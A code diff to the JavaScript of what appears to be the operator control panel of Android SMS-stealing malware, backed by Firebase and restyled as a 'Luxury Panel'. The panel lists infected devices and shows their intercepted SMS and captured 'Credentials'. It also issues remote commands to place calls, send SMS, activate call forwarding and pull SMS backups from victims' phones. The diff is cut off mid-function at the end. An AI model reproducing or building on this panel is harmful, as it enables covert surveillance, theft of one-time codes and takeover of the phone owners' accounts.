@@ -1,5 +1,5 @@
 /* ============================================================ */
-/* app.js - Ultra Fast Firebase Loader                          */
+/* app.js - Luxury Panel Logic                                  */
 /* ============================================================ */
 
 // ============================================================
@@ -19,27 +19,22 @@ firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
 
 // ============================================================
-// STATE - FAST CACHE
+// STATE
 // ============================================================
 let cachedData = {};
 let expandedDevices = {};
 let activeTabs = {};
-let isPanelOpen = { devices: false, sms: false, backup: false };
+let isPanelOpen = { devices: true, sms: false, backup: false, analytics: false };
 let formMemory = {};
-
-// Pagination
 let deviceOffset = 0;
-const DEVICE_LIMIT = 10;
+const DEVICE_LIMIT = 8;
 let allDeviceKeys = [];
-
 let allSmsList = [];
 let allSmsOffset = 0;
-const SMS_LIMIT = 15;
-
+const SMS_LIMIT = 12;
 let modalSmsList = [];
 let modalSmsOffset = 0;
 let modalTarget = 'ALL';
-
 let deviceSmsCache = {};
 
 // ============================================================
@@ -48,22 +43,22 @@ let deviceSmsCache = {};
 const $ = (id) => document.getElementById(id);
 
 // ============================================================
-// CONNECTION MONITOR - FAST
+// CONNECTION MONITOR
 // ============================================================
 db.ref(".info/connected").on("value", (snap) => {
     const badge = $('statusBadge');
     const text = $('statusText');
     if (snap.val() === true) {
-        badge.className = 'status-badge online';
+        badge.className = 'connection-status online';
         text.textContent = 'Online';
     } else {
-        badge.className = 'status-badge offline';
+        badge.className = 'connection-status offline';
         text.textContent = 'Offline';
     }
 });
 
 // ============================================================
-// MAIN DATA LISTENER - INSTANT LOAD
+// MAIN DATA LISTENER
 // ============================================================
 let firstLoad = true;
 
@@ -74,33 +69,42 @@ db.ref().on("value", (snapshot) => {
     const typing = active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA' || active.tagName === 'SELECT');
     if (typing) return;
 
-    // Render everything instantly
     renderAll();
 
-    // Auto-open devices on first load
     if (firstLoad) {
         firstLoad = false;
-        setTimeout(() => {
-            if (!isPanelOpen.devices) {
-                togglePanel('devices');
-            }
-        }, 100);
+        // Default panel open
+        if (!isPanelOpen.devices) {
+            togglePanel('devices');
+        }
     }
 });
 
 // ============================================================
-// RENDER ALL - FAST
+// RENDER ALL
 // ============================================================
 function renderAll() {
     renderDevices();
     renderAllSms();
+    renderAnalytics();
     updateBackupDeviceList();
 
-    // Update counts instantly
+    // Update counts
     const devices = cachedData.user_data || {};
     const keys = Object.keys(devices);
     $('deviceCount').textContent = keys.length;
-    $('panelDeviceCount').textContent = keys.length + ' devices';
+
+    let online = 0,
+        offline = 0;
+    keys.forEach(id => {
+        const d = devices[id];
+        const isOnline = d.isOnline || d.online || false;
+        if (isOnline) online++;
+        else offline++;
+    });
+    $('onlineCount').textContent = online;
+    $('offlineCount').textContent = offline;
+    $('panelDeviceCount').textContent = keys.length;
 
     const smsData = cachedData.user_sms || {};
     let totalSms = 0;
@@ -108,7 +112,7 @@ function renderAll() {
         totalSms += Object.keys(smsData[d]).length;
     });
     $('smsCount').textContent = totalSms;
-    $('panelSmsCount').textContent = totalSms + ' messages';
+    $('panelSmsCount').textContent = totalSms;
 
     if (isPanelOpen.backup) {
         const selected = $('backupDeviceSelect').value;
@@ -120,49 +124,55 @@ function renderAll() {
 }
 
 // ============================================================
-// TOGGLE PANELS
+// TOGGLE PANEL
 // ============================================================
 function togglePanel(panel) {
-    const panels = ['devices', 'sms', 'backup'];
-    const btnMap = {
+    const panels = ['devices', 'sms', 'backup', 'analytics'];
+    const navMap = {
         devices: 'btnDevices',
         sms: 'btnSms',
-        backup: 'btnBackup'
+        backup: 'btnBackup',
+        analytics: 'btnAnalytics'
     };
 
     panels.forEach(p => {
         if (p !== panel) {
-            $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`).classList.remove('active');
-            $(btnMap[p]).classList.remove('active');
+            const el = $(`panel${p.charAt(0).toUpperCase() + p.slice(1)}`);
+            if (el) el.classList.remove('active');
+            const nav = document.querySelector(`.nav-item[data-panel="${p}"]`);
+            if (nav) nav.classList.remove('active');
             isPanelOpen[p] = false;
         }
     });
 
     const panelEl = $(`panel${panel.charAt(0).toUpperCase() + panel.slice(1)}`);
-    const btn = $(btnMap[panel]);
-    isPanelOpen[panel] = !isPanelOpen[panel];
+    const nav = document.querySelector(`.nav-item[data-panel="${panel}"]`);
 
-    if (isPanelOpen[panel]) {
-        panelEl.classList.add('active');
-        btn.classList.add('active');
-        if (panel === 'devices') renderDevices();
-        if (panel === 'sms') renderAllSms();
-        if (panel === 'backup') {
-            updateBackupDeviceList();
-            const selected = $('backupDeviceSelect').value;
-            if (selected) {
-                updateBackupStatusDisplay(selected);
-                loadBackupSmsForDevice(selected);
+    if (panelEl) {
+        isPanelOpen[panel] = !isPanelOpen[panel];
+        if (isPanelOpen[panel]) {
+            panelEl.classList.add('active');
+            if (nav) nav.classList.add('active');
+            if (panel === 'devices') renderDevices();
+            if (panel === 'sms') renderAllSms();
+            if (panel === 'analytics') renderAnalytics();
+            if (panel === 'backup') {
+                updateBackupDeviceList();
+                const selected = $('backupDeviceSelect').value;
+                if (selected) {
+                    updateBackupStatusDisplay(selected);
+                    loadBackupSmsForDevice(selected);
+                }
             }
+        } else {
+            panelEl.classList.remove('active');
+            if (nav) nav.classList.remove('active');
         }
-    } else {
-        panelEl.classList.remove('active');
-        btn.classList.remove('active');
     }
 }
 
 // ============================================================
-// RENDER DEVICES - FAST WITH PAGINATION
+// RENDER DEVICES
 // ============================================================
 function renderDevices() {
     const container = $('devicesContainer');
@@ -170,7 +180,7 @@ function renderDevices() {
     allDeviceKeys = Object.keys(devices);
 
     if (allDeviceKeys.length === 0) {
-        container.innerHTML = `<div class="no-data"><i class="fas fa-mobile-alt"></i> No devices registered</div>`;
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-mobile-alt" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No devices registered</div>`;
         return;
     }
 
@@ -189,7 +199,7 @@ function renderDevices() {
         if (!online && lastSeen && (Date.now() - lastSeen < 120000)) online = true;
 
         const statusClass = online ? 'online' : 'offline';
-        const statusText = online ? '🟢 Online' : '🔴 Offline';
+        const statusText = online ? '● Online' : '● Offline';
         const timeStr = lastSeen ? new Date(lastSeen).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) : 'N/A';
 
         const smsData = cachedData.user_sms || {};
@@ -221,17 +231,17 @@ function renderDevices() {
         }
 
         html += `
-            <div class="device-card ${isExpanded ? 'expanded' : ''}" id="card-${devId}" onclick="toggleDevice('${devId}')">
-                <div class="device-header">
+            <div class="device-card-luxury ${isExpanded ? 'expanded' : ''}" id="card-${devId}" onclick="toggleDevice('${devId}')">
+                <div class="device-top">
                     <div>
-                        <div class="device-title">📱 ${devId}</div>
-                        <div style="font-size:10px;color:var(--text-muted);margin-top:1px;">
+                        <div class="device-name">📱 ${devId}</div>
+                        <div style="font-size:10px;color:var(--text-muted);margin-top:2px;">
                             ${isExpanded ? '▲ Click to collapse' : '▼ Click to expand'}
                         </div>
                     </div>
                     <div style="text-align:right;">
                         <span class="device-status ${statusClass}">${statusText}</span>
-                        <div style="font-size:9px;color:var(--text-muted);margin-top:1px;">${timeStr}</div>
+                        <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">⏱ ${timeStr}</div>
                     </div>
                 </div>
 
@@ -242,7 +252,7 @@ function renderDevices() {
                 </div>
 
                 <div class="device-body">
-                    <div class="device-actions">
+                    <div class="device-actions-luxury">
                         <button class="sub-btn ${activeTab === 'sms' ? 'active-sms' : ''}" onclick="event.stopPropagation();setTab('${devId}','sms')">
                             💬 ${totalSms}
                         </button>
@@ -256,24 +266,24 @@ function renderDevices() {
                     </div>
 
                     <div class="section-box ${activeTab === 'sms' ? 'active' : ''}" id="sec-sms-${devId}">
-                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
-                            <h4 style="color:var(--blue);margin:0;font-size:12px;">💬 SMS (${totalSms})</h4>
-                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--blue);color:#fff;border:none;padding:2px 10px;border-radius:6px;font-size:10px;cursor:pointer;">⛶</button>
+                        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;">
+                            <h4 style="color:var(--gold-light);margin:0;font-size:13px;">💬 SMS (${totalSms})</h4>
+                            <button onclick="event.stopPropagation();openSmsModal('${devId}')" style="background:var(--gold);color:#0c0e14;border:none;padding:2px 12px;border-radius:6px;font-size:10px;font-weight:600;cursor:pointer;">⛶ Full</button>
                         </div>
-                        <div class="sms-card-list">
+                        <div class="sms-list-luxury">
                             ${renderSmsCards(devSmsList)}
-                            ${devSmsList.length === 0 ? '<div class="no-data">No SMS</div>' : ''}
+                            ${devSmsList.length === 0 ? '<div class="empty-luxury">No SMS</div>' : ''}
                         </div>
-                        ${hasMoreSms ? `<button class="load-more-btn" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
+                        ${hasMoreSms ? `<button class="btn-load-more" style="margin-top:6px;padding:6px;font-size:11px;" onclick="event.stopPropagation();loadMoreDeviceSms('${devId}')">📥 Load More</button>` : ''}
                     </div>
 
                     <div class="section-box ${activeTab === 'login' ? 'active' : ''}" id="sec-login-${devId}">
-                        <h4 style="color:var(--orange);font-size:12px;">🔑 Credentials</h4>
+                        <h4 style="color:#f59e0b;font-size:13px;">🔑 Credentials</h4>
                         <div class="table-wrapper">
                             <table>
                                 <thead><tr><th>Fields</th></tr></thead>
                                 <tbody>
-                                    ${devLoginList.length === 0 ? '<tr><td class="no-data">No credentials</td></tr>' :
+                                    ${devLoginList.length === 0 ? '<tr><td class="empty-luxury">No credentials</td></tr>' :
                                     devLoginList.map(rec => {
                                         let txt = '';
                                         for (let k in rec) txt += `<b>${k}:</b> ${rec[k]}<br>`;
@@ -285,45 +295,45 @@ function renderDevices() {
                     </div>
 
                     <div class="section-box ${activeTab === 'call' ? 'active' : ''}" id="sec-call-${devId}">
-                        <h4 style="color:var(--green);font-size:12px;">📞 Call</h4>
-                        <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
+                        <h4 style="color:var(--green);font-size:13px;">📞 Make Call</h4>
+                        <input type="text" id="callNum-${devId}" value="${formMemory[`callNum-${devId}`] || ''}" placeholder="Phone Number" oninput="formMemory['callNum-${devId}']=this.value" onclick="event.stopPropagation()">
                         <select id="callSim-${devId}" onchange="formMemory['callSim-${devId}']=this.value" onclick="event.stopPropagation()">
                             <option value="0" ${(formMemory[`callSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                             <option value="1" ${(formMemory[`callSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                         </select>
-                        <button class="cmd-btn purple-btn" onclick="event.stopPropagation();sendCall('${devId}')"><i class="fas fa-phone"></i> Call</button>
+                        <button class="btn-luxury btn-purple" onclick="event.stopPropagation();sendCall('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;"><i class="fas fa-phone"></i> Call</button>
                     </div>
 
                     <div class="section-box ${activeTab === 'sendsms' ? 'active' : ''}" id="sec-sendsms-${devId}">
-                        <h4 style="color:var(--purple);font-size:12px;">✉️ Send SMS</h4>
+                        <h4 style="color:var(--purple);font-size:13px;">✉️ Send SMS</h4>
                         <input type="text" id="smsNum-${devId}" value="${formMemory[`smsNum-${devId}`] || ''}" placeholder="Recipient" oninput="formMemory['smsNum-${devId}']=this.value" onclick="event.stopPropagation()">
                         <textarea id="smsText-${devId}" placeholder="Message" rows="2" oninput="formMemory['smsText-${devId}']=this.value" onclick="event.stopPropagation()">${formMemory[`smsText-${devId}`] || ''}</textarea>
                         <select id="smsSim-${devId}" onchange="formMemory['smsSim-${devId}']=this.value" onclick="event.stopPropagation()">
                             <option value="1" ${(formMemory[`smsSim-${devId}`] || '1') === '1' ? 'selected' : ''}>SIM 1</option>
                             <option value="2" ${(formMemory[`smsSim-${devId}`] || '1') === '2' ? 'selected' : ''}>SIM 2</option>
                         </select>
-                        <button class="cmd-btn blue-btn" onclick="event.stopPropagation();sendSms('${devId}')"><i class="fas fa-paper-plane"></i> Send</button>
+                        <button class="btn-luxury btn-blue" onclick="event.stopPropagation();sendSms('${devId}')" style="padding:8px;font-size:11px;width:100%;justify-content:center;"><i class="fas fa-paper-plane"></i> Send</button>
                     </div>
 
                     <div class="section-box ${activeTab === 'fwd' ? 'active' : ''}" id="sec-fwd-${devId}">
-                        <h4 style="color:var(--red);font-size:12px;">🔀 Forward</h4>
+                        <h4 style="color:var(--red);font-size:13px;">🔀 Call Forward</h4>
                         <input type="text" id="fwdNum-${devId}" value="${formMemory[`fwdNum-${devId}`] || ''}" placeholder="Forward To" oninput="formMemory['fwdNum-${devId}']=this.value" onclick="event.stopPropagation()">
                         <select id="fwdSim-${devId}" onchange="formMemory['fwdSim-${devId}']=this.value" onclick="event.stopPropagation()">
                             <option value="0" ${(formMemory[`fwdSim-${devId}`] || '0') === '0' ? 'selected' : ''}>SIM 1</option>
                             <option value="1" ${(formMemory[`fwdSim-${devId}`] || '0') === '1' ? 'selected' : ''}>SIM 2</option>
                         </select>
-                        <button class="cmd-btn" style="background:var(--green);color:#fff;margin-bottom:4px;" onclick="event.stopPropagation();sendFwd('${devId}','call forward')"><i class="fas fa-play"></i> Activate</button>
-                        <button class="cmd-btn danger-btn" onclick="event.stopPropagation();sendFwd('${devId}','forward off')"><i class="fas fa-stop"></i> Deactivate</button>
+                        <button class="btn-luxury" style="background:var(--green);color:#fff;padding:8px;font-size:11px;width:100%;justify-content:center;margin-bottom:4px;" onclick="event.stopPropagation();sendFwd('${devId}','call forward')"><i class="fas fa-play"></i> Activate</button>
+                        <button class="btn-luxury btn-red" onclick="event.stopPropagation();sendFwd('${devId}','forward off')" style="padding:8px;font-size:11px;width:100%;justify-content:center;"><i class="fas fa-stop"></i> Deactivate</button>
                     </div>
 
                     <div class="section-box ${activeTab === 'backup' ? 'active' : ''}" id="sec-backup-${devId}">
-                        <h4 style="color:var(--cyan);font-size:12px;">💾 Backup</h4>
-                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:4px;">
-                            <button class="cmd-btn purple-btn" onclick="event.stopPropagation();triggerDeviceBackup('${devId}')"><i class="fas fa-database"></i> Backup</button>
-                            <button class="cmd-btn blue-btn" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')"><i class="fas fa-sync"></i> Refresh</button>
+                        <h4 style="color:#06b6d4;font-size:13px;">💾 Backup</h4>
+                        <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
+                            <button class="btn-luxury btn-purple" onclick="event.stopPropagation();triggerDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;"><i class="fas fa-database"></i> Backup</button>
+                            <button class="btn-luxury btn-blue" onclick="event.stopPropagation();refreshDeviceBackup('${devId}')" style="padding:8px;font-size:11px;justify-content:center;"><i class="fas fa-sync"></i> Refresh</button>
                         </div>
-                        <div id="deviceBackup-${devId}" style="margin-top:6px;padding:6px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
-                            Click Refresh to check status...
+                        <div id="deviceBackup-${devId}" style="margin-top:8px;padding:8px;background:var(--bg-primary);border-radius:6px;border:1px solid var(--border-color);font-size:11px;color:var(--text-muted);">
+                            Click Refresh to check status
                         </div>
                     </div>
                 </div>
@@ -335,7 +345,7 @@ function renderDevices() {
 
     if (hasMore) {
         container.innerHTML += `
-            <button class="load-more-btn" onclick="loadMoreDevices()">
+            <button class="btn-load-more" onclick="loadMoreDevices()">
                 <i class="fas fa-chevron-down"></i> Load More (${allDeviceKeys.length - end} remaining)
             </button>
         `;
@@ -343,13 +353,13 @@ function renderDevices() {
 }
 
 // ============================================================
-// RENDER SMS CARDS - FAST
+// RENDER SMS CARDS
 // ============================================================
 function renderSmsCards(list, showDevice = false) {
     if (!list || list.length === 0) return '';
     return list.map(msg => `
-        <div class="sms-card">
-            <div class="sms-card-header">
+        <div class="sms-card-luxury">
+            <div class="sms-header">
                 <div class="sms-sender">
                     ${showDevice ? `<span class="device-tag">[${msg.deviceId}]</span> ` : ''}
                     👤 ${msg.sender || msg.address || 'Unknown'}
@@ -364,131 +374,7 @@ function renderSmsCards(list, showDevice = false) {
 }
 
 // ============================================================
-// BACKUP SMS FUNCTIONS - INSTANT
-// ============================================================
-function loadBackupSmsForDevice(devId) {
-    const container = $('backupSmsList');
-    if (!devId) {
-        container.innerHTML = '<div class="no-data" style="padding:12px;">Select a device</div>';
-        return;
-    }
-
-    // Check cached data first
-    const backupData = cachedData.backup_sms;
-    if (backupData && backupData[devId]) {
-        renderBackupSmsList(container, backupData[devId]);
-        return;
-    }
-
-    container.innerHTML = '<div class="loading-placeholder" style="padding:8px;"><i class="fas fa-spinner fa-spin"></i></div>';
-
-    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
-        if (snap.exists()) {
-            renderBackupSmsList(container, snap.val());
-        } else {
-            container.innerHTML = '<div class="no-data" style="padding:12px;">No backup SMS found</div>';
-        }
-    }).catch(() => {
-        container.innerHTML = '<div class="no-data" style="padding:12px;color:var(--red);">❌ Error loading</div>';
-    });
-}
-
-function renderBackupSmsList(container, data) {
-    const messages = [];
-    Object.keys(data).forEach(key => {
-        messages.push({ key, ...data[key] });
-    });
-    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
-    if (messages.length === 0) {
-        container.innerHTML = '<div class="no-data" style="padding:12px;">No backup SMS</div>';
-        return;
-    }
-
-    container.innerHTML = messages.map(msg => `
-        <div class="backup-sms-item">
-            <div class="sms-header">
-                <span class="sender">👤 ${msg.sender || msg.address || 'Unknown'}</span>
-                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
-            </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
-                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
-                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
-            </div>
-        </div>
-    `).join('');
-}
-
-// ============================================================
-// OPEN BACKUP SMS MODAL - INSTANT
-// ============================================================
-function openBackupSmsModal() {
-    const modal = $('backupSmsModal');
-    const body = $('backupModalBody');
-    const title = $('backupModalTitle');
-
-    title.textContent = '💾 All Backup SMS';
-    body.innerHTML = '<div class="loading-placeholder"><i class="fas fa-spinner fa-spin"></i> Loading...</div>';
-    modal.classList.add('open');
-
-    const backupData = cachedData.backup_sms;
-    if (backupData) {
-        renderAllBackupSms(body, backupData);
-        return;
-    }
-
-    db.ref('backup_sms').once('value').then(snap => {
-        if (snap.exists()) {
-            renderAllBackupSms(body, snap.val());
-        } else {
-            body.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i> No backup SMS found</div>';
-        }
-    }).catch(() => {
-        body.innerHTML = '<div class="no-data" style="color:var(--red);">❌ Error loading</div>';
-    });
-}
-
-function renderAllBackupSms(container, data) {
-    let allMsgs = [];
-    Object.keys(data).forEach(devId => {
-        const devMsgs = data[devId];
-        Object.keys(devMsgs).forEach(key => {
-            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
-        });
-    });
-    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
-
-    if (allMsgs.length === 0) {
-        container.innerHTML = '<div class="no-data"><i class="fas fa-inbox"></i> No backup SMS</div>';
-        return;
-    }
-
-    container.innerHTML = allMsgs.map(msg => `
-        <div class="backup-sms-item">
-            <div class="sms-header">
-                <span class="sender">
-                    <span style="color:var(--green);font-size:10px;">[${msg.deviceId}]</span>
-                    👤 ${msg.sender || msg.address || 'Unknown'}
-                </span>
-                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
-            </div>
-            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
-            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
-                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
-                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
-            </div>
-        </div>
-    `).join('');
-}
-
-function closeBackupSmsModal(e) {
-    if (e && e.target !== e.currentTarget) return;
-    $('backupSmsModal').classList.remove('open');
-}
-
-// ============================================================
-// ALL SMS - INSTANT
+// RENDER ALL SMS
 // ============================================================
 function renderAllSms() {
     const container = $('allSmsContainer');
@@ -507,7 +393,7 @@ function renderAllSms() {
     }
 
     if (allSmsList.length === 0) {
-        container.innerHTML = `<div class="no-data"><i class="fas fa-inbox"></i> No SMS found</div>`;
+        container.innerHTML = `<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No messages found</div>`;
         loadMore.style.display = 'none';
         return;
     }
@@ -531,30 +417,165 @@ function renderAllSms() {
 }
 
 // ============================================================
-// LOAD MORE FUNCTIONS
+// RENDER ANALYTICS
 // ============================================================
-function loadMoreDevices() {
-    deviceOffset += DEVICE_LIMIT;
-    renderDevices();
-}
+function renderAnalytics() {
+    const devices = cachedData.user_data || {};
+    const deviceCount = Object.keys(devices).length;
+    $('analyticsTotalDevices').textContent = deviceCount;
 
-function loadMoreDeviceSms(devId) {
-    if (deviceSmsCache[devId]) {
-        deviceSmsCache[devId].offset += SMS_LIMIT;
-        renderDevices();
-        expandedDevices[devId] = true;
-        activeTabs[devId] = 'sms';
+    const smsData = cachedData.user_sms || {};
+    let totalSms = 0;
+    Object.keys(smsData).forEach(d => {
+        totalSms += Object.keys(smsData[d]).length;
+    });
+    $('analyticsTotalSms').textContent = totalSms;
+
+    const backupData = cachedData.backup_sms || {};
+    let backupCount = 0;
+    Object.keys(backupData).forEach(d => {
+        backupCount += Object.keys(backupData[d]).length;
+    });
+    $('analyticsBackupSms').textContent = backupCount;
+
+    // Last activity
+    let latest = 0;
+    Object.keys(smsData).forEach(d => {
+        const msgs = smsData[d];
+        Object.keys(msgs).forEach(k => {
+            const ts = msgs[k].timestamp || 0;
+            if (ts > latest) latest = ts;
+        });
+    });
+    if (latest > 0) {
+        const d = new Date(latest);
+        $('analyticsLastActivity').textContent = d.toLocaleDateString() + ' ' + d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    } else {
+        $('analyticsLastActivity').textContent = '—';
     }
 }
 
-function loadMoreAllSms() {
-    allSmsOffset += SMS_LIMIT;
-    renderAllSms();
+// ============================================================
+// BACKUP SMS FUNCTIONS
+// ============================================================
+function loadBackupSmsForDevice(devId) {
+    const container = $('backupSmsList');
+    if (!devId) {
+        container.innerHTML = '<div class="empty-luxury">Select a device to view backup messages</div>';
+        return;
+    }
+
+    const backupData = cachedData.backup_sms;
+    if (backupData && backupData[devId]) {
+        renderBackupSmsList(container, backupData[devId]);
+        return;
+    }
+
+    container.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading...</div>';
+
+    db.ref(`backup_sms/${devId}`).once('value').then(snap => {
+        if (snap.exists()) {
+            renderBackupSmsList(container, snap.val());
+        } else {
+            container.innerHTML = '<div class="empty-luxury">No backup SMS found</div>';
+        }
+    }).catch(() => {
+        container.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
+    });
 }
 
-function loadMoreModalSms() {
-    modalSmsOffset += SMS_LIMIT;
-    renderModalSms();
+function renderBackupSmsList(container, data) {
+    const messages = [];
+    Object.keys(data).forEach(key => {
+        messages.push({ key, ...data[key] });
+    });
+    messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+    if (messages.length === 0) {
+        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
+        return;
+    }
+
+    container.innerHTML = messages.map(msg => `
+        <div class="backup-sms-item">
+            <div class="sms-header">
+                <span class="sender">👤 ${msg.sender || msg.address || 'Unknown'}</span>
+                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
+            </div>
+            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
+            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
+                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
+                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
+            </div>
+        </div>
+    `).join('');
+}
+
+// ============================================================
+// OPEN BACKUP SMS MODAL
+// ============================================================
+function openBackupSmsModal() {
+    const modal = $('backupSmsModal');
+    const body = $('backupModalBody');
+    const title = $('backupModalTitle');
+
+    title.textContent = '💾 All Backup Messages';
+    body.innerHTML = '<div class="loading-luxury"><span class="loader-ring"></span> Loading backups...</div>';
+    modal.classList.add('open');
+
+    const backupData = cachedData.backup_sms;
+    if (backupData) {
+        renderAllBackupSms(body, backupData);
+        return;
+    }
+
+    db.ref('backup_sms').once('value').then(snap => {
+        if (snap.exists()) {
+            renderAllBackupSms(body, snap.val());
+        } else {
+            body.innerHTML = '<div class="empty-luxury"><i class="fas fa-inbox" style="font-size:32px;display:block;margin-bottom:10px;color:var(--text-muted);"></i>No backup messages</div>';
+        }
+    }).catch(() => {
+        body.innerHTML = '<div class="empty-luxury" style="color:var(--red);">❌ Error loading</div>';
+    });
+}
+
+function renderAllBackupSms(container, data) {
+    let allMsgs = [];
+    Object.keys(data).forEach(devId => {
+        const devMsgs = data[devId];
+        Object.keys(devMsgs).forEach(key => {
+            allMsgs.push({ deviceId: devId, key, ...devMsgs[key] });
+        });
+    });
+    allMsgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
+
+    if (allMsgs.length === 0) {
+        container.innerHTML = '<div class="empty-luxury">No backup messages</div>';
+        return;
+    }
+
+    container.innerHTML = allMsgs.map(msg => `
+        <div class="backup-sms-item">
+            <div class="sms-header">
+                <span class="sender">
+                    <span style="color:var(--gold-light);font-size:10px;">[${msg.deviceId}]</span>
+                    👤 ${msg.sender || msg.address || 'Unknown'}
+                </span>
+                <span>${msg.date_formatted || msg.date || new Date(msg.timestamp).toLocaleString()}</span>
+            </div>
+            <div class="sms-body">${escapeHtml(msg.body || 'No content')}</div>
+            <div style="font-size:9px;color:var(--text-muted);margin-top:2px;">
+                ${msg.sim_number ? '📱 ' + msg.sim_number : ''}
+                ${msg.backup_id ? ' • 💾 ' + msg.backup_id : ''}
+            </div>
+        </div>
+    `).join('');
+}
+
+function closeBackupSmsModal(e) {
+    if (e && e.target !== e.currentTarget) return;
+    $('backupSmsModal').classList.remove('open');
 }
 
 // ============================================================
@@ -567,7 +588,7 @@ function openSmsModal(target) {
 
     const smsData = cachedData.user_sms || {};
     if (target === 'ALL') {
-        $('modalTitle').textContent = '📩 All SMS';
+        $('modalTitle').textContent = '📩 All Messages';
         Object.keys(smsData).forEach(devId => {
             const msgs = smsData[devId];
             Object.keys(msgs).forEach(k => {
@@ -575,7 +596,7 @@ function openSmsModal(target) {
             });
         });
     } else {
-        $('modalTitle').textContent = `📩 SMS for ${target}`;
+        $('modalTitle').textContent = `📩 Messages for ${target}`;
         if (smsData[target]) {
             Object.keys(smsData[target]).forEach(k => {
                 modalSmsList.push(smsData[target][k]);
@@ -613,6 +634,33 @@ function renderModalSms() {
 function closeSmsModal(e) {
     if (e && e.target !== e.currentTarget) return;
     $('smsModal').classList.remove('open');
+}
+
+// ============================================================
+// LOAD MORE FUNCTIONS
+// ============================================================
+function loadMoreDevices() {
+    deviceOffset += DEVICE_LIMIT;
+    renderDevices();
+}
+
+function loadMoreDeviceSms(devId) {
+    if (deviceSmsCache[devId]) {
+        deviceSmsCache[devId].offset += SMS_LIMIT;
+        renderDevices();
+        expandedDevices[devId] = true;
+        activeTabs[devId] = 'sms';
+    }
+}
+
+function loadMoreAllSms() {
+    allSmsOffset += SMS_LIMIT;
+    renderAllSms();
+}
+
+function loadMoreModalSms() {
+    modalSmsOffset += SMS_LIMIT;
+    renderModalSms();
 }
 
 // ============================================================
@@ -695,14 +743,14 @@ function sendFwd(devId, cmd) {
 }
 
 // ============================================================
-// BACKUP FUNCTIONS - FAST
+// BACKUP FUNCTIONS
 // ============================================================
 function updateBackupDeviceList() {
     const select = $('backupDeviceSelect');
     const devices = cachedData.user_data || {};
     const keys = Object.keys(devices);
     const current = select.value;
-    select.innerHTML = '<option value="">-- Select --</option>';
+    select.innerHTML = '<option value="">— Select a device —</option>';
     keys.forEach(id => {
         const dev = devices[id];
         const name = dev.d_name || dev.device_name || id;
@@ -717,7 +765,7 @@ function updateBackupStatusDisplay(devId) {
     const dev = cachedData.user_data?.[devId];
     if (!dev) {
         $('backupStatusValue').textContent = 'Device not found';
-        $('backupStatusValue').className = 'value failed';
+        $('backupStatusValue').className = 'status-value failed';
         return;
     }
 
@@ -730,16 +778,16 @@ function updateBackupStatusDisplay(devId) {
     const statusEl = $('backupStatusValue');
     if (st === 'success') {
         statusEl.textContent = '✅ ' + (msg || 'Backup successful');
-        statusEl.className = 'value success';
+        statusEl.className = 'status-value success';
     } else if (st === 'in_progress' || st === 'pending') {
         statusEl.textContent = '⏳ ' + (msg || 'In progress...');
-        statusEl.className = 'value pending';
+        statusEl.className = 'status-value pending';
     } else if (st === 'failed' || st === 'error') {
         statusEl.textContent = '❌ ' + (msg || 'Backup failed');
-        statusEl.className = 'value failed';
+        statusEl.className = 'status-value failed';
     } else {
         statusEl.textContent = '📊 ' + (msg || 'No backup');
-        statusEl.className = 'value';
+        statusEl.className = 'status-value';
     }
 
     const last = info.last_backup_time || info.timestamp || null;
@@ -763,7 +811,7 @@ function triggerBackup() {
 function triggerDeviceBackup(devId) {
     if (!devId) return;
     $('backupStatusValue').textContent = '⏳ Sending...';
-    $('backupStatusValue').className = 'value pending';
+    $('backupStatusValue').className = 'status-value pending';
 
     db.ref(`user_data/${devId}`).update({
